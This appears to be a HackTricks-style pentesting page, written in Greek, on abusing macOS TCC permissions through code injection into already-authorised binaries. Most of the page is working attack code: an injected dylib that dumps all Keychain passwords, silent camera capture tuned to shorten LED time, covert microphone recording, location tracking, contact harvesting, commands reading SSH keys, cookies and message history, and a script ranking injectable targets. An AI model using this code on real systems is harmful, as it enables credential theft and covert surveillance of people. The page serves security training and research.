# Κλοπή διαπιστευτηρίων και δεδομένων στο macOS μέσω δικαιωμάτων TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το macOS TCC (Transparency, Consent, and Control) προστατεύει την πρόσβαση σε ευαίσθητα δεδομένα χρηστών. Όταν ένας attacker **παραβιάζει ένα binary που διαθέτει ήδη δικαιώματα TCC**, κληρονομεί αυτά τα δικαιώματα. Αυτή η σελίδα τεκμηριώνει τις δυνατότητες εκμετάλλευσης κάθε δικαιώματος TCC που σχετίζεται με την κλοπή δεδομένων.<sup>[[2]](#references)</sup>

> [!WARNING]
> Η εισαγωγή κώδικα σε ένα binary με δικαιώματα TCC (μέσω DYLD injection, dylib hijacking ή task port) **κληρονομεί αθόρυβα όλα τα δικαιώματα TCC του**. Δεν εμφανίζεται πρόσθετο prompt ούτε πραγματοποιείται επαλήθευση όταν η ίδια διεργασία διαβάζει προστατευμένα δεδομένα.<sup>[[4]](#references)</sup>

---

## Ομάδες πρόσβασης Keychain

### Το Έπαθλο

Το macOS Keychain αποθηκεύει:
- **Κωδικούς Wi-Fi** — όλα τα αποθηκευμένα διαπιστευτήρια ασύρματων δικτύων
- **Κωδικούς ιστοτόπων** — κωδικούς του Safari, του Chrome (όταν χρησιμοποιεί το Keychain) και άλλων browsers
- **Κωδικούς εφαρμογών** — λογαριασμούς email, διαπιστευτήρια VPN, development tokens
- **Πιστοποιητικά και private keys** — code signing, client TLS, κρυπτογράφηση S/MIME
- **Ασφαλείς σημειώσεις** — secrets αποθηκευμένα από τον χρήστη

### Entitlement: `keychain-access-groups`

Τα αντικείμενα του Keychain οργανώνονται σε **ομάδες πρόσβασης**. Το entitlement `keychain-access-groups` μιας εφαρμογής παραθέτει τις ομάδες στις οποίες μπορεί να αποκτήσει πρόσβαση:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Εκμετάλλευση
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Κλοπή Keychain
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Πρόσβαση στην κάμερα (kTCCServiceCamera)

### Εκμετάλλευση

Ένα δυαδικό αρχείο με παραχώρηση TCC για την κάμερα (μέσω του `kTCCServiceCamera` ή του entitlement `com.apple.security.device.camera`) μπορεί να καταγράφει φωτογραφίες και βίντεο:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Αθόρυβη Καταγραφή
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Ξεκινώντας με το **macOS Sonoma**, η ένδειξη της κάμερας στη γραμμή μενού είναι μόνιμη και δεν μπορεί να αποκρυφτεί μέσω προγραμματισμού. Σε **παλαιότερες εκδόσεις του macOS**, μια σύντομη καταγραφή ενδέχεται να μην εμφανίσει κάποια noticeable ένδειξη.

---

## Πρόσβαση στο μικρόφωνο (kTCCServiceMicrophone)

### Εκμετάλλευση

Η πρόσβαση στο μικρόφωνο καταγράφει όλο τον ήχο από το ενσωματωμένο μικρόφωνο, τα ακουστικά ή τις συνδεδεμένες συσκευές εισόδου ήχου:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attack: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Εντοπισμός τοποθεσίας (kTCCServiceLocation)

### Εκμετάλλευση
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Συνεχής παρακολούθηση
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Επαφές / Ημερολόγιο / Φωτογραφίες

### Exfiltration Προσωπικών Δεδομένων

| TCC Service | Framework | Δεδομένα |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Ονόματα, emails, τηλέφωνα, διευθύνσεις |
| `kTCCServiceCalendar` | `EventKit` | Συναντήσεις, συμμετέχοντες, τοποθεσίες |
| `kTCCServicePhotos` | `Photos.framework` | Φωτογραφίες, screenshots, μεταδεδομένα τοποθεσίας |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Συλλογή επαφών
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Πρόσβαση σε λογαριασμό iCloud

### Entitlement: `com.apple.private.icloud-account-access`

Αυτό το entitlement επιτρέπει την επικοινωνία με την υπηρεσία XPC `com.apple.iCloudHelper`, παρέχοντας πρόσβαση σε:
- **iCloud tokens** — tokens authentication για το Apple ID του χρήστη
- **iCloud Drive** — συγχρονισμένα έγγραφα από όλες τις συσκευές
- **iCloud Keychain** — passwords συγχρονισμένα σε όλες τις συσκευές Apple
- **Find My** — την τοποθεσία όλων των συσκευών Apple του χρήστη<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Η παραβίαση ενός binary με δικαιώματα iCloud επεκτείνει την επίθεση από **μία μόνο συσκευή σε ολόκληρο το Apple ecosystem**: άλλα Mac, iPhone, iPad και Apple Watch. Ο συγχρονισμός του iCloud Keychain σημαίνει ότι είναι προσβάσιμοι οι κωδικοί πρόσβασης από όλες τις συσκευές.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### Το ισχυρότερο TCC Permission

Το Full Disk Access παρέχει δυνατότητα ανάγνωσης σε **κάθε αρχείο του συστήματος**, συμπεριλαμβανομένων:
- Δεδομένων άλλων εφαρμογών (Messages, Mail, ιστορικό Safari)
- TCC databases (αποκαλύπτοντας όλα τα άλλα permissions)
- SSH keys και configuration
- Browser cookies και session tokens
- Application databases και caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Πίνακας Προτεραιότητας Exploitation

Κατά την αξιολόγηση injectable binaries με άδεια TCC, δώστε προτεραιότητα με βάση την αξία των δεδομένων:

| Προτεραιότητα | Άδεια TCC | Γιατί |
|---|---|---|
| **Critical** | Full Disk Access | Πρόσβαση σε όλα |
| **Critical** | TCC Manager | Μπορεί να εκχωρήσει οποιαδήποτε άδεια |
| **High** | Keychain Access Groups | Όλοι οι αποθηκευμένοι κωδικοί πρόσβασης |
| **High** | iCloud Account Access | Compromise πολλαπλών συσκευών |
| **High** | Input Monitoring (ListenEvent) | Keylogging |
| **High** | Accessibility | Έλεγχος GUI, self-granting |
| **Medium** | Screen Capture | Καταγραφή οπτικών δεδομένων |
| **Medium** | Camera + Microphone | Παρακολούθηση |
| **Medium** | Contacts + Calendar | Δεδομένα για social engineering |
| **Low** | Location | Φυσική παρακολούθηση |
| **Low** | Photos | Προσωπικά δεδομένα |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Υπηρεσίες Keychain](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "Ό,τι συμβαίνει στο Mac σας, παραμένει στο iCloud της Apple;!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — Εκμετάλλευση TCC](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
